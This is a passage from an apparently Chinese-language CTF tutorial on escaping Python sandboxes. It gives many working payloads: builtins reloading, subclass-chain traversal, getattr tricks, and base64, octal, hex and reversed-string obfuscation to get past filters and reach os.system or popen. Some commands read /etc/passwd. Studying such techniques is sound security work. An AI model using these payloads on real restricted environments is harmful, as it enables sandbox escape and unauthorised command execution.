class="string">&#x27;sh&#x27;</span>)    <span class="comment"># py3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line">__builtins__.__dict__[_import__](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="路径引入os等模块">路径引入os等模块</h4>
<p>因为一般都是禁止引入敏感包，当禁用os时，实际上就是 <code>sys.modules[‘os’]=None</code></p>
<p>而因为一般的类Linux系统的python os路径都是<code>/usr/lib/python2.7/os.py</code> ,所以可以通过路径引入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/pythonx.xx/os.py&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="reload模块"><code>reload</code>模块</h4>
<p>禁止引用某些函数时，可能会删除掉一些函数的引用,比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这样就无法再引入，但是我们可以用 <code>reload(__builtins__)</code> 重载builtins模块恢复内置函数</p>
<p>但是<strong>reload</strong>本身也是<strong>builtins</strong>模块的函数，其本身也可能会被禁掉</p>
<p>在可以引用包的情况下，我们还可以使用<code>imp模块</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtins__)</span><br></pre></td></tr></table></figure>
<p>这样就可以得到完整的<code>builtins</code>模块了，需要注意的是需要先<code>import __builtins__ </code>,如果不写的话，虽然<code>builtins</code>模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的：</p>
<blockquote>
<p>引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import <code>builtins</code>，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</p>
</blockquote>
<p>再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？<br>
可以尝试上面的<code>execfile()</code>函数,或者open函数打开文件，exec执行代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="comment"># py2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">&lt;built-in function eval&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">KeyError: &#x27;eval&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; reload(__builtins__)</span></span><br><span class="line">&lt;module &#x27;__builtin__&#x27; (built-in)&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">&lt;built-in function eval&gt; </span><br></pre></td></tr></table></figure>
<h4 id="函数名字符串扫描过滤的绕过-通过getattr-来字符串操作">函数名字符串扫描过滤的绕过(通过<code>getattr()</code>来字符串操作)</h4>
<p>假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作</p>
<p>这里就可以使用： <code>getattr</code> 、<code>__getattribute__</code></p>
<ul>
<li><strong>用法</strong>：
<ul>
<li><code>getattr</code> 是一个函数，用于获取属性，通常用于动态属性访问，提供了更高层次的抽象和便利。</li>
<li><code>__getattribute__</code> 是对象的内置<code>方法</code>，它用于在访问<code>对象</code>的<code>任何属性</code>时自动调用。这是一个低级别的钩子，用于拦截属性访问，可以对其进行<code>重载</code>以<code>自定义属性访问行为</code>。</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>),<span class="string">&quot;flfgrz&quot;</span>.encode(<span class="string">&quot;rot13&quot;</span>))(<span class="string">&#x27;ls&#x27;</span>) <span class="comment"># py2 的decode不用我多说</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>),<span class="string">&quot;metsys&quot;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).__getattribute__(<span class="string">&quot;metsys&quot;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 注意，在使用文件路径import os后：execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)，这个方法会报错，改成</span></span><br><span class="line"><span class="comment"># 直接用os.__getattribute__(&quot;metsys&quot;[::-1])(&#x27;ls&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).__getattribute__(<span class="string">&quot;flfgrz&quot;</span>.encode(<span class="string">&quot;rot13&quot;</span>))(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。<br>
如果某个类定义了 getattribute() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）</p>
</blockquote>
<p>runoob ：<a class="link"   target="_blank" rel="noopener" href="http://www.runoob.com/python/python-func-getattr.html" >http://www.runoob.com/python/python-func-getattr.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="恢复-sys-modules">恢复 <code>sys.modules</code></h4>
<p>一些过滤中可能将 <code>sys.modules['os']</code> 进行修改,这个时候即使将 os 模块导入进来,也是无法使用的.</p>
<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<p>由于 import 导入模块时会检查 sys.modules 中<code>是否已经有这个类</code>，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可。</p>
<p>或者说，我们这一步：<code>del sys.modules['os']</code>已经把<code>os</code>设置成一个字符串了，看报错就知道</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</span><br></pre></td></tr></table></figure>
<p><code>os</code>已经变成一个字符串类了，所以删了重导就行了</p>
<h4 id="基于继承链获取（object类）">基于继承链获取（object类）</h4>
<p>在清空了 <code>__builtins__</code>的情况下，我们也可以通过索引 subclasses 来找到这些内建函数。</p>
<p>py2跟py3不一样</p>
<p>py2里面<code>file</code></p>
<p>py3里面可以用<code>os._wrap_close</code></p>
<p><strong>通过mro方法获取继承关系</strong></p>
<p>payload:（py2）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>).read()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;flag&quot;).read()&#x27;</span> ) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[0].__subclasses__()[59]</span></span><br><span class="line"><span class="string">&lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br><span class="line"><span class="string">注意，py2里面的func_globals在py3重写成__globals__了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 可以执行命令寻找subclasses下引入过os模块的模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload（py3）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># warnings.catch_warnings也可以用，不过要重找</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>不能直接在模块的 <code>__globals__</code> 字典中，而是在 <code>__builtins__</code> 字典中找。</p>
<h4 id="字符串拼接">字符串拼接</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>当然，如果过滤的是 <code>__class__</code> 或者 <code>__mro__</code> 这样的属性名，就无法采用变形来绕过了。</p>
<h4 id="base64-变形">base64 变形</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)] (<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># py2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="逆序">逆序</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意 exec 与 eval 在执行上有所差异。</p>
<h4 id="进制转换">进制转换</h4>
<p>八进制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess</span></span><br><span class="line">s = <span class="string">&quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 16进制</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>其他编码</strong></p>
<p>hex、rot13、base32 等。</p>
<h4 id="过滤了属性名或者函数名：">过滤了属性名或者函数名：</h4>
<p>在 payload 的构造中，我们大量的使用了各种类中的属性，例如 <strong>class</strong>、<strong>import</strong> 等。</p>
<h4 id="getattr-函数">getattr 函数</h4>
<p>getattr 是 Python 的内置函数，用于获取一个对象的属性或者方法。其语法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">object</span>, name[, default]) </span><br></pre></td></tr></table></figure>
<p>这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br></pre></td></tr></table></figure>
<p>这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。</p>
<h4 id="getattribute-函数">__getattribute__ 函数</h4>
<p><code>getattr</code> 函数在调用时，实际上就是调用这个类的 <code>__getattribute__</code> 方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.\__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line">os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line">__getattr__ 函数</span><br></pre></td></tr></table></figure>
<p><strong>getattr</strong> 是 Python 的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个 AttributeError 异常。</p>
<p>如下是 <strong>getattr</strong> 方法的基本形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure>
<p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p>
<p>与 _<em>getattribute</em>_ 不同，<strong>getattr</strong> 只有在属性查找失败时才会被调用，这使得 <strong>getattribute</strong> 可以用来更为全面地控制属性访问。</p>
<p>如果在一个类中同时定义了 <strong>getattr</strong> 和 <strong>getattribute</strong>，那么无论属性是否存在，<strong>getattribute</strong> 都会被首先调用。只有当 <strong>getattribute</strong> 抛出 AttributeError 异常时，<strong>getattr</strong> 才会被调用。</p>
<blockquote>
<p>另外，所有的类都会有__getattribute__属性，而不一定有__getattr__属性。</p>
</blockquote>
<h4 id="globals-替换"><em>_globals</em>_ 替换</h4>
<p><strong>globals</strong> 可以用 func_globals 直接替换；</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>__mro__、__bases__、__base__互换</p>
<p>三者之间可以相互替换</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure>
<h4 id="过滤-import">过滤 import</h4>
<p>python 中除了可以使用 import 来导入，还可以使用 _<em>import</em>_ 和 <code>importlib.import_module</code> 来导入模块</p>
<p><em>_import</em>_</p>
<p><em>_import</em>_(‘os’)<br>
<code>importlib.import_module</code></p>
<p>注意：importlib 需要进行导入之后才能够使用,所以有些鸡肋。。。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="loader-load-module">__loader__.load_module</h4>
<p>如果使用 <code>audithook</code> 的方式进行过滤,上面的两种方法就无法使用了,但是 <strong>loader</strong>.load_module 底层实现与 import 不同, 因此某些情况下可以绕过.</p>
<p><strong>loader</strong>.load_module(‘os’)<br>
&lt;module ‘os’ (built-in)&gt;</p>
<h4 id="绕过"><code>[]</code>绕过</h4>
<p>如果中括号被过滤了，则可以使用如下的两种方式来绕过：</p>
<h5 id="调用-getitem-函数直接替换；">调用__getitem__()函数直接替换；</h5>
<p>调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">200</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>) <span class="comment">#py2</span></span><br></pre></td></tr></table></figure>
<h5 id="getitem-替换中括号"><strong>getitem</strong>()替换中括号[]</h5>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="pop-替换中括号-，结合-getitem-利用">pop()替换中括号[]，结合__getitem__()利用</h5>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().pop(<span class="number">200</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__,<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="绕过-2"><code>''</code>绕过</h4>
<h5 id="str-函数">str 函数</h5>
<p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str() 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="chr-函数">chr 函数</h5>
<p>也可以使用 chr 加数字来构造字符串</p>
